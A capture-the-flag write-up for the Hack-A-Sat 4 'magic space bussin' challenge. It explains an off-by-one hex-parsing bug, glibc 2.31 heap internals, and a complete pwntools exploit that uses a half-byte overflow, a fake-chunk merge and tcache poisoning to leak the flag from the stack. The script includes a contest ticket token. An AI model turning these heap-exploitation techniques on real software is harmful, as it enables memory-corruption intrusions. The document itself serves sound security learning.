Disclaimer: The ASCII-Diagrams are properly rendered in the
[original](https://ctf0.de/posts/hackasat4-magic-space-bussin/).

------------

# Challenge

The source code, the compiled binary and a Dockerfile are provided with the
challenge. Furthermore, there is a `malloc.c` next to the binary. The
`malloc.c` is the one from glibc 2.32. In contrast to this, the provided
Dockerfile builds on Ubuntu 20.04, which uses glibc 2.31. Since there were
some major changes in the malloc code between those two versions, we later
have to figure out the one used on the challenge.

The challenge itself offers a space bus with two pipes. We can post and
receive messages from and to both pipes. Messages are read in the same order
as they are posted. The messages can be provided as raw bytes or as hex.

# Vulnerability

While reading the source code, we identified a problem in case the message is
provided as hex. The functions for calculating the payload length and
allocating the buffer calculate the length differently:  
```C++  
size_t SB_Pipe::CalcPayloadLen(bool ishex, const std::string& s){  
   if(ishex && (s.length() % 2 == 0)){  
       return s.length() / 2;  
   }  
   else{  
       return s.length();  
   }  
}

uint8_t* SB_Pipe::AllocatePlBuff(bool ishex, const std::string& s){  
   if(ishex){  
       return new uint8_t[s.length() / 2];  
   }  
   else{  
       return new uint8_t[s.length()];  
   }  
}  
```

In combination with the parsing of the message payload, this results in two
different useful cases when providing the payload as hex.  
```C++  
SB_Msg* SB_Pipe::ParsePayload(const std::string& s, bool ishex, uint8_t
pipe_id, uint8_t msg_id){  
   if(s.length() == 0){  
       return nullptr;  
   }

   uint8_t* msg_s = AllocatePlBuff(ishex, s);

   if(ishex){  
       char cur_byte[3] = {0};

       for(size_t i = 0, j = 0; i < CalcPayloadLen(ishex, s); i+=2, j++){  
           cur_byte[0] = s[i];  
           cur_byte[1] = s[i+1];  
           msg_s[j] = static_cast<uint8_t>(std::strtol(cur_byte, nullptr, 16));  
       }  
   }  
   else{  
       for(size_t i = 0; i < CalcPayloadLen(ishex, s); i++){  
           msg_s[i] = static_cast<uint8_t>(s[i]);  
       }  
   }

   SB_Msg* payload = new SB_Msg{  
       msg_s,  
       pipe_id,  
       msg_id,  
       CalcPayloadLen(ishex, s)  
   };

   return payload;  
}  
```

If the length is even, a buffer of length `n/2` will be allocated in
`AllocatePlBuff`. Since `CalcPayloadLen` also divides the length by two, only
the first half of the payload will be written to the buffer, leaving the
second half of the buffer untouched, resulting in a memory leak.

If the length is odd, a buffer of length `(n-1)/2` will be allocated in
`AllocatePlBuff`. Since `CalcPayloadLen` returns the exact length and `i` is
always even, the last iteration of the loop will overflow the allocated buffer
by one byte. Since the last hex char and the terminating null byte are copied
to the translation buffer, the lower half of the overflown byte will be set to
the provided hex value while the upper half will be set to zero. Furthermore,
the length of the message is set to the length of the hex string, resulting in
a buffer over-read when receiving a test message (message id 100).  
```C++  
size_t StarTracker::test_msg(SB_Msg* msg){ // 100

   for(size_t i = 0; i < msg->size; i++){  
       printf("%#x ", msg->data[i]);  
   }

   std::cout << std::endl;

   return SB_SUCCESS;  
}  
```

As a result, the second case is very useful. The over-read can be used to leak
the heap and glibc address, while the overflow can be leveraged to compromise
the heap and allocate buffers at arbitrary locations. But let's first start
with the basics of the heap to further understand this strategy.

# malloc

The `new` operator in C++ uses `malloc` to get the needed buffer for the newly
created object. `malloc` manages memory in chunks with sizes of multiples of
16 bytes. Each chunk consists of a header containing the size of the current
and previous chunk and a body for the user data. If the chunks are free, the
user space of the chunk is used for storing the free chunks in lists. Since
the previous size field is only needed for merging with the previous chunk, it
is only present in free chunks and used for storing user data if the previous
chunk is in use. The least significant bits of the size field are used for
storing flags, since they would otherwise always be unset. The most important
one is the previous in use flag stored in the least significant bit. It is set
if the previous chunk is in use. The other two flags signal are set if the
chunk was allocated via `mmap` or does not belong to the main arena.  
```goat  
            .-  +------------------------+  
            |   |  size of previous      |  
    header -+   | ---------------------- |  
            |   |  size         | flags  |  
            '-  | ---------------------- |  -.  
                |  forward pointer       |   |  
                | ---------------------- |   |  
                |  backward pointer      |   |  
                | ---------------------- |   |  
                |  next size pointer     |   +- user data  
                | ---------------------- |   |  
                |  prev size pointer     |   |  
            .-  +------------------------+   |  
            |   |  size                  |   |  
next header -+   | ---------------------- |  -'  
            |   |  size of next | flags  |  
            '-  | ---------------------- |  
```

An arena is a collection of one or more large memory regions that share the
same lists of free chunks. If only a small number of threads is used, each
thread will have it's own arena. While the main arena is allocated close after
the application, the other arenas will be mapped directly above the glibc.
Since the challenge uses only one thread, the main arena will be used.

Free chunks are stored in bins. There are five different bin types:  
- tcache bins  
- fast bins  
- unsorted bin  
- small bins  
- large bins

There are two types of bins: tcache and fast bins that store the chunks in a
singly linked list and the unsorted bin and small and large bins that use
doubly linked lists for storing their chunks. While tcache, fast bins and
small bins store only chunks of exactly one size, the unsorted bin and large
bins store chunks of multiple sizes. Because of that and since only chunks in
large bins are ordered by size, the fields for pointers to the chunk of next
and previous size are only used in large bins. The different bins feature
different restrictions on the chunk size. Furthermore, tcache bins are limited
to seven chunks in order to prevent chunk hoarding, as chunks in tcache are
only accessible by one thread, while the other bins are used by all threads
that use the arena.

`free` first tries to place the chunks into tcache and fast bins. All
remaining chunks are marked as free, merged with adjacent chunks and queued
into the unsorted bin.

`malloc` first tries to find a chunk of the requested size by searching the
tcache, fast bin, small bin, unsorted bin and last the large bin. Bins of
chunks with unsuitable size are skipped. While the unsorted bin is searched
for a suitable chunk, the processed chunks are inserted in their corresponding
small or large bin. In case of a large request, all chunks inside the fast
bins are marked as free, merged with adjacent chunks and queued into the
unsorted bin. If no suitable chunk is found, `malloc` will try to split a
bigger chunk. If that also fails, the top chunk, which is in no list, will be
split and the heap expanded if the top chunk is to small.

# Strategy

Since the x86 architecture stores integers in little-endian, the flags of the
chunk header are stored in the lower half of the first byte following the
previous chunk. This allows us to leverage the half byte overflow to set the
flags of the next chunk. If we unset the previous in use bit and create a fake
chunk with valid pointers, a valid header and a corresponding previous size
field, we can trigger a merge with the next chunk. This will create a chunk
overlapping with our chunk, enabling us to overwrite the pointers of the
merged chunk.

The fake chunk must be removable from a doubly linked list. To accomplish
this, we will point the forward and backward pointers to the fake chunk
itself. This will bypass the consistency checks (`P->bk->fd == P && P->fd->bk
== P`) and allows the relinking of the next and previous chunks in our faked
list. The needed heap leek can be received by the over-read of chunk followed
by a chunk in a tcache or fast bin. Furthermore we will set the previous in
use flag of the fake chunk to skip some tests and to prevent later merging
with the non-existing previous chunk.

To trigger the merging of our fake chunk with the next chunk, we have to free
the next chunk into the unsorted bin. Since the upper half of the least
significant byte will be set to zero, the size of the next chunk has to be a
multiple of 256 bytes to pass the performed consistency checks. As fast bins
only store chunks up to 128 bytes, we do not need to worry about the next
chunk being freed into a fast bin. The freeing into a tcache bin can be
prevented in two ways: The next chunk can either be larger than the largest
tcache bin (1040 bytes) or we can free seven chunks of the same size in
advance to occupy all slots.

Since the flag is stored as environment variable, it is saved at the bottom of
the stack. As the position of the stack is randomized, we first need to find a
pointer to the stack before we can access it. Luckily, all recent glibc
versions feature one close after the main arena. In case of the glibc 2.31
used in this challenge, there is a pointer to the
`program_invocation_short_name`, i.e. a part of the arguments used to call the
program. These are stored directly before the environment variables and
thereby allow us to access the flag. Since the doubly linked lists are an
entry in their own list, we can leak the address of the main arena by
leveraging the over-read with a chunk that is the first or last entry in one
of the doubly linked bins.

After knowing the address of the pointer to the
`program_invocation_short_name`, we can use the overflow into the merged fake
chunk to corrupt the singly linked list of a tcache bin. Since neither the
alignment nor the size of the chunk returned from a tcache bin is checked in
glibc 2.31, subsequent calls to `malloc` will dereference the next pointers
one after the other and, thereby, will eventually return a chunk located on
the stack. Since `malloc` only pops a chunk from tcache if the counter is
greater than zero, there need to be at least three chunks in the used bin: The
one with the overflowable next pointer, a chunk that is replaced with glibc
and the one that will be moved to the stack.

# Exploit

After we now developed a high level strategy for leaking the flag, let's adapt
this strategy to the challenge. First we have to find interfering calls to
`malloc`, since they change the heap layout and may mess with our carefully
allocated and freed chunks.

## Other allocations

Despite some allocations, for example for the two space trackers, are done on
initialization, those do not pose a threat, since they will never be freed and
because they are all done without interleaving temporary requests. As a result
of no temporary requests, all these long living objects will be split from the
top chunk, leaving no wholes that may mess with our strategy. Thereby, we can
concentrate on the allocations and deallocations performed during sending and
receiving messages.

So let's start pwndbg and break at `__libc_malloc` and `__libc_free`, the
functions that are weakly bound to `malloc` and `free`.

When we send a message, the input is read from `std::cin`. While reading
integers does not trigger an allocation, reading the message triggers multiple
calls to `malloc` and `free`. `std::getline` first allocates 0x1f bytes. If
the input length exceeds the length of the buffer, a new buffer of size `old *
2 - 1` is allocated and the old buffer is freed. After the message is read,
the buffer for the decoded message is allocated. Furthermore a `SB_Msg` object
of 24 bytes (chunk size: 0x20) is allocated for storing the metadata.
Afterwards, the `SB_Bus` adds the message to his queue, which results in an
additional allocation of 32 bytes (chunk size: 0x30)for the node in the queue.
Finally, the metadata object and the read line is freed.

When we receive a message, a new `SB_Msg` object is created for the message.
After removing the message from the queue and freeing it's node, the message
is printed or simply dropped. Finally the message and the metadata object are
freed.

## Abstraction

Before we will write the exploit, let's first create two methods for sending
and receiving messages to capsule the raw interaction with the challenge from
the exploit for an easier and cleaner exploit script.

```python  
def post_message(con: tube, msg_id: int, pipe_id: int, is_hex: bool, msg:
bytes) -> None:  
   con.sendlineafter(b"> ", b"1")  
   con.sendlineafter(b"msg_id: ", str(msg_id).encode())  
   con.sendlineafter(b"pipe_id: ", str(pipe_id).encode())  
   if is_hex:  
       con.sendlineafter(b"hex: ", b"1")  
   else:  
       con.sendlineafter(b"hex: ", b"0")  
   con.sendlineafter(b"Message to post on bus: ", msg)

def recv_message(con: tube, pipe: int) -> bytes:  
   con.sendlineafter(b"> ", str(pipe+2).encode())  
   con.recvuntil(b"StarTracker: Testing Message\n")  
   msg = con.recvuntil(b" \n")[:-2]  
   return bytes([int(byte, 16) for byte in msg.split(b" ")])  
```

After we now know all calls to `malloc` and `free` and have proper methods for
allocating and freeing buffers, we can build our exploit.

## Leak libc

Let's start with leaking the address of the libc.  
```python  
def leak_libc(con):  
   post_message(con, 100, 0, True, b"f"*(0x3c1*2-3))  
   leak = recv_message(con, 0)  
   print(hexdump(leak))  
   bin_address = u64(leak[0x3d0:0x3d8])  
   print(f"bin for size of 0x790 is at {hex(bin_address)}")  
   return bin_address

io = start()

stack_pointer = leak_libc(io) + 0x10c*8  
print(f"stack pointer at {hex(stack_pointer)}")  
```  
For the first message, we provide 0x77f hex characters. This carefully chosen
message length fits the allocation of the last but one chunk needed for the
input. Since the allocated chunk has a size of 0x3d0 bytes, the half byte
overflow only overwrites an unused byte at the end of the chunk. To fit the
input, a buffer of 0x781 bytes (chunk size: 0x790) is allocated. As the
`SB_msg` object does not fit into one of the already allocated and freed
chunks (0x30, 0x50, 0x90, 0x100, 0x1f0) and because all of these chunks reside
in their tcache bins, which are only used for allocations of the same size, a
new chunk is allocated directly after the chunk for the hex input. Thereby,
the `SB_msg` chunk separates the input chunk from the top chunk. As a result,
the input chunk will be freed into the unsorted bin. If we now receive the
message, the `SB_msg` object will be reallocated from tcache and the message
will be printed. As the message is stored in the chunk directly before the one
the input buffer that was freed into the unsorted bin and because this chunk
is the only chunk in that bin, the over-read will leak the address of the
unsorted bin. With this leak, we can compute the address of the
`program_invocation_short_name`, which is located `0x10c * 8` bytes after the
unsorted bin.

## Leak Heap

Now it's time for leaking the heap. The input chunks from leaking the libc
address are all behind one another and all but the largest one are in tcache.
Since these chunks are the only one of their size, their next pointer will be
NULL, i.e. leaking it will not reveal the heap address. Despite that, we don't
need to add additional chunks of the same size, since we can leverage the
protection against double free to leak the heap address. In older versions of
glibc, such as the one used in this challenge, protection against double free
is achieved by writing the address of the tcache struct to the backward
pointer of the chunk. If a new chunk is added to tcache, this pointer will be
checked and in case of a match, glibc will traverse the bin to prevent false
positives. Since the tcache struct is located at the start of the heap, we can
use it to compute the position of our relevant chunks.

```python  
def leak_heap(con: tube) -> None:  
   post_message(con, 100, 0, True, b"f"*(0x1e1*2+1))  
   leak = recv_message(con, 0)  
   print(hexdump(leak))  
   heap_base = u64(leak[0x1f8:0x200]) & ~0xfff  
   print(f"heap is at {hex(heap_base)}")  
   return heap_base

heap_base = leak_heap(io)  
chunk_3c1_content = heap_base + 0x16cd0  
print(f"3c1 chunk at {hex(chunk_3c1_content)}")  
```

Since this works, the service uses indeed glibc 2.31, as 2.32 would use a
canary like value for the key.

## Create fake chunk

Since we now know the address of our chunk, we can create a fake chunk.

First we allocate two chunks to have two `Node` objects. While the size of the
second chunk can be chosen arbitrarily, the first one has to be one that will
result in a chunk of 0x790 bytes. This is important, as we want a chunk of
0x100 bytes to be allocated directly after the 0x3d0 chunk used for our input
in the previous steps, since it is followed by the 0x790 chunk that resides in
the unsorted bin and can be split into smaller chunks. Since we only need the
nodes, we can free both chunks directly afterwards.

Now we can fill the tcache with seven chunks of the same size. Therefore we
first have to allocate seven messages of the same size. Since the second
allocation will be the first one split from the big 0x790 chunk, we save it
inside the other pipe for later use. Since we need the chunks to be in tcache,
we free all seven messages from the first pipe directly afterwards.

Before we can trigger the merge, we have to create the fake chunk inside the
chunk before the saved one. The chunk has a size of 0x3d0 bytes, i.e. the
previous size field is at offset 0x3c0. We further have to choose a fake chunk
size, such that the merged chunk will be of a size that fits into tcache and
that is not used when reading the input, as this would mess with our carefully
designed heap layout. We choose a size of 0x40 bytes for a total size of the
merged chunk of 0x140 bytes. The created fake chunk has the following
contents:

```goat  
offset 0x380 --> +------------------------------------+ <--.  
                |  unused (size of previous)         |    |  
                | ---------------------------------- |    |  
                |  0x41 (size of fake chunk | flags) |    |  
                | ---------------------------------- |    |  
                |  forward pointer         o---------+----+  
                | ---------------------------------- |    |  
                |  backward pointer        o---------+----'  
                | ---------------------------------- |  
                |                                    |  
                | ---------------------------------- |  
                |                                    |  
                | ---------------------------------- |  
                |                                    |  
                | ---------------------------------- |  
                |                                    |  
merge target --> +------------------------------------+  
                |  0x40  (size of fake chunk)        |  
                | ---------------------------------- | <-- end of our chunk data area  
                |  0x100 (size of next | flags)      |  
                | ---------------------------------- |  
```

Since we later want to overwrite parts of the fake chunk, we write a utility
function for this. In order to alter the fake chunk, we first have to change
the contents of the big chunk that contains the start of the fake chunk. As
the big chunk is not needed afterwards and since we may want to reallocate it
later for other changes to the fake chunk, we can free it directly afterwards.  
```python  
def change_fake_chunk(con: tube, size: int, forward: int, backward: int=0) ->
None:  
   payload = flat({  
           # size  
           0x388: size | 1,  
           # forward, backward  
           0x390: forward,  
           0x398: backward,  
           # prev size  
           0x3c0: size,  
       })  
   post_message(con, 100, 0, True, payload.hex().encode() + b"0")  
   recv_message(con, 0)  
```

After preparing the fake chunk, we can now free the 0x100 chunk that we saved
for later. As it cannot be freed into tcache since it is full, it will be
merged with the prepared fake chunk and the resulting chunk will be appended
to the unsorted bin.

```python  
def create_fake_chunk_0x140(con: tube, base_address: int) -> None:  
   # allocate second Node object outside first big chunk  
   post_message(con, 100, 0, True, b"f"*(0x781*2+1))  
   post_message(con, 100, 0, True, b"f"*1001)  
   recv_message(con, 0)  
   recv_message(con, 0)

   post_message(con, 100, 0, True, b"f"*0x1e9)  
   post_message(con, 100, 1, True, b"f"*0x1e9) # first chunk split from the
big one

   # fill tcache  
   for _ in range(6):  
       post_message(con, 100, 0, True, b"f"*0x1e9)  
   for _ in range(7):  
       recv_message(con, 0)

   # unset previous in use flag and prepare fake chunk  
   change_fake_chunk(con, 0x40, base_address + 0x380, base_address + 0x380)

   # trigger merge  
   recv_message(con, 1)  
   print("fake chunk created")

create_fake_chunk_0x140(io, chunk_3c1_content)  
```

## Get a chunk on the stack

Now we can move a chunk to the stack. In order to achieve this, we have to
overwrite the next pointer of a free tcache chunk with the address of
`program_invocation_short_name` calculated previously when we leaked the
address of libc. To furthermore be able to allocate chunks at these addresses,
the counter of the tcache bin needs to be adjusted. Since we want to allocate
three chunks (our fake chunk, the one in libc and the one onto the stack), we
first have to free the fake chunk and two other chunks of the same size to the
corresponding tcache bin. Since tcache bins are handled like stacks, i.e. the
last chunk freed will be malloced first, our fake chunk must be freed last. To
accomplish this, we will malloc the fake chunk in the first pipe and use the
second pipe for the remaining chunks. After the tcache bin is prepared with
the correct amount of chunks, we can alter the next pointer of the fake chunk
with our target. In order to not mess with adjacent chunks, we provide an even
amount of hex chunks and thereby don't write the full chunk.

```python  
def prepare_malloc_target(con: tube, target: int, size: int=0x140) -> None:  
   # allocate fake chunk  
   post_message(con, 100, 0, True, b"f"*((size-8)*2))

   # allocate + free other chunks  
   post_message(con, 100, 1, True, b"f"*((size-8)*2))  
   post_message(con, 100, 1, True, b"f"*((size-8)*2))  
   recv_message(con, 1)  
   recv_message(con, 1)

   # free fake chunk  
   recv_message(con, 0)

   # change next pointer of fake chunk  
   change_fake_chunk(con, size, target)  
   print("tcache prepared")

SIZE = 0x140

prepare_malloc_target(io, stack_pointer, SIZE)  
```

After we prepared and correctly linked the tcache chunks, we can allocate the
chunk onto the stack.  
```python  
# dereference next pointers  
post_message(io, 100, 0, True, b"f"*((SIZE-8)*2))  
post_message(io, 100, 0, True, b"f"*((SIZE-8)*2))

# malloc stack  
post_message(io, 100, 1, True, b"f"*((SIZE-8)*2+1))

# leak stack  
leak = recv_message(io, 1)  
print(hexdump(leak))  
```

Unfortunately, the leak part of the stack does not contain the flag. If we
dump the end of the stack in gdb and compare it with our outputs, we notice,
that we dumped the area after the flag. In order to dump the flag, we have to
shrink our buffer.

## Shrink fake chunk

In order to shrink the fake chunk, we first have to move it from the unsorted
bin to tcache, since allocating and freeing chunks from unsorted bin triggers
a bunch of tests that are hard to circumvent in our current situation. In
contrast, tcache features much less and much weaker checks, such that we only
have to change the size in the header of the fake chunk while it is allocated.
For leaking the variable part at the end of the flag, a chunk size of 0x80
with an input of an odd number of hex chars is sufficient, while a chunk size
of 0x70 with an even number of hex chars results in the constant front part of
the flag being leaked.

```python  
def shrink_fake_chunk(con: tube, new_size: int) -> None:  
   post_message(con, 100, 0, True, b"f"*(0x138*2))  
   change_fake_chunk(con, new_size, 0)  
   recv_message(con, 0)  
   print(f"shrinked chunk to {new_size:x}")

SIZE = 0x80

shrink_fake_chunk(io, SIZE)  
```

## Full exploit script

Together with the typical pwntools boiler plate code and some adjustments for
Hack-A-Sat, we get the full exploit script:  
```python  
#!/usr/bin/env python3  
# -*- coding: utf-8 -*-  
from pwn import *

context.terminal = ["tmux", "splitw", "-h"]

elf = context.binary = ELF('./magic')

host = args.HOST or 'magic.quals2023-kah5Aiv9.satellitesabove.me'  
port = int(args.PORT or 5300)

def start_local(argv=[], *a, **kw):  
   '''Execute the target binary locally'''  
   if args.GDB:  
       return gdb.debug([elf.path] + argv, gdbscript=gdbscript, *a, **kw)  
   else:  
       return process([elf.path] + argv, *a, **kw)

def start_remote(argv=[], *a, **kw):  
   '''Connect to the process on the remote host'''  
   io = connect(host, port)  
   if args.GDB:  
       gdb.attach(io, gdbscript=gdbscript)  
   elif host != "localhost":  
       io.sendlineafter(b"Ticket please:\n", b"ticket{victor319320juliet4:GJ_fZHwnIpvb_CgZcrCcvo6_sGBEa3lhFg3ihTX6iiX77Ux3yqA5Se8zH7IMpwBy8A}")  
   return io

def start(argv=[], *a, **kw):  
   '''Start the exploit against the target.'''  
   if args.LOCAL:  
       return start_local(argv, *a, **kw)  
   else:  
       return start_remote(argv, *a, **kw)

gdbscript = '''  
break send_msg  
continue  
delete  
break __libc_malloc  
break __libc_free  
continue  
'''.format(**locals())

# -- Exploit goes here --

def post_message(con: tube, msg_id: int, pipe_id: int, is_hex: bool, msg:
bytes) -> None:  
   con.sendlineafter(b"> ", b"1")  
   con.sendlineafter(b"msg_id: ", str(msg_id).encode())  
   con.sendlineafter(b"pipe_id: ", str(pipe_id).encode())  
   if is_hex:  
       con.sendlineafter(b"hex: ", b"1")  
   else:  
       con.sendlineafter(b"hex: ", b"0")  
   con.sendlineafter(b"Message to post on bus: ", msg)

def recv_message(con: tube, pipe: int) -> bytes:  
   con.sendlineafter(b"> ", str(pipe+2).encode())  
   con.recvuntil(b"StarTracker: Testing Message\n")  
   msg = con.recvuntil(b" \n")[:-2]  
   return bytes([int(byte, 16) for byte in msg.split(b" ")])

def leak_libc(con):  
   post_message(con, 100, 0, True, b"f"*(0x3c1*2-3))  
   leak = recv_message(con, 0)  
   print(hexdump(leak))  
   bin_address = u64(leak[0x3d0:0x3d8])  
   print(f"bin for size of 0x790 is at {hex(bin_address)}")  
   return bin_address

def leak_heap(con: tube) -> None:  
   post_message(con, 100, 0, True, b"f"*(0x1e1*2+1))  
   leak = recv_message(con, 0)  
   print(hexdump(leak))  
   heap_base = u64(leak[0x1f8:0x200]) & ~0xfff  
   print(f"heap is at {hex(heap_base)}")  
   return heap_base

def change_fake_chunk(con: tube, size: int, forward: int, backward: int=0) ->
None:  
   payload = flat({  
           # size  
           0x388: size | 1,  
           # forward, backward  
           0x390: forward,  
           0x398: backward,  
           # prev size  
           0x3c0: size,  
       })  
   post_message(con, 100, 0, True, payload.hex().encode() + b"0")  
   recv_message(con, 0)

def create_fake_chunk_0x140(con: tube, base_address: int) -> None:  
   # allocate second Node object outside first big chunk  
   post_message(con, 100, 0, True, b"f"*(0x781*2+1))  
   post_message(con, 100, 0, True, b"f"*1001)  
   recv_message(con, 0)  
   recv_message(con, 0)

   post_message(con, 100, 0, True, b"f"*0x1e9)  
   post_message(con, 100, 1, True, b"f"*0x1e9) # first chunk split from the
big one

   # fill tcache  
   for _ in range(6):  
       post_message(con, 100, 0, True, b"f"*0x1e9)  
   for _ in range(7):  
       recv_message(con, 0)

   # unset previous in use flag and prepare fake chunk  
   change_fake_chunk(con, 0x40, base_address + 0x380, base_address + 0x380)

   # trigger merge  
   recv_message(con, 1)  
   print("fake chunk created")

def shrink_fake_chunk(con: tube, new_size: int) -> None:  
   post_message(con, 100, 0, True, b"f"*(0x138*2))  
   change_fake_chunk(con, new_size, 0)  
   recv_message(con, 0)  
   print(f"shrinked chunk to {new_size:x}")

def prepare_malloc_target(con: tube, target: int, size: int=0x140) -> None:  
   # allocate fake chunk  
   post_message(con, 100, 0, True, b"f"*((size-8)*2))

   # allocate + free other chunks  
   post_message(con, 100, 1, True, b"f"*((size-8)*2))  
   post_message(con, 100, 1, True, b"f"*((size-8)*2))  
   recv_message(con, 1)  
   recv_message(con, 1)

   # free fake chunk  
   recv_message(con, 0)

   # change next pointer of fake chunk  
   change_fake_chunk(con, size, target)  
   print("tcache prepared")

def leak_flag_part(first_part: bool) -> str:

   SIZE=0x70  
   if first_part:  
       SIZE = 0x80

   io = start()

   stack_pointer = leak_libc(io) + 0x10c*8  
   print(f"stack pointer at {hex(stack_pointer)}")

   heap_base = leak_heap(io)  
   chunk_3c1_content = heap_base + 0x16cd0  
   print(f"3c1 chunk at {hex(chunk_3c1_content)}")

   create_fake_chunk_0x140(io, chunk_3c1_content)

   shrink_fake_chunk(io, SIZE)

   prepare_malloc_target(io, stack_pointer, SIZE)

   # dereference next pointers  
   post_message(io, 100, 0, True, b"f"*((SIZE-8)*2))  
   post_message(io, 100, 0, True, b"f"*((SIZE-8)*2))

   part = ""

   if first_part:  
       post_message(io, 100, 1, True, b"f"*((SIZE-0xb)*2))  
       leak = recv_message(io, 1)  
       print(hexdump(leak))

   # calculate optimal length  
   length = (SIZE-8)*2+1  
   if first_part:  
       length = (SIZE-0xb)*2

   # malloc stack  
   post_message(io, 100, 1, True, b"f"*length)

   # leak stack  
   leak = recv_message(io, 1)  
   print(hexdump(leak))

   # clean up  
   io.close()

   # extract flag part  
   if first_part:  
       return leak[leak.find(b"flag{"):].decode()  
   else:  
       return leak[leak.find(b"\x0f")+1:leak.find(b"}")+1].decode()

# get flag parts  
part1 = leak_flag_part(True)  
part2 = leak_flag_part(False)

print(f"{part1 = }")  
print(f"{part2 = }")

print("\n\n")

# reconstruct flag  
flag = part1[:part1.find(part2[:4])] + part2

print(f"{flag = }")  
```

Executing it reveals the flag:
`flag{victor319320juliet4:GJv8_G785iQMjpJMB8bMH_VprUP3gSbv1nUbW4jnzWh7Sv4mVKmBzPcZNwzRN95dNBQ4eIPP91vWKYTIJEsZB9w}`

Original writeup (https://ctf0.de/posts/hackasat4-magic-space-bussin/).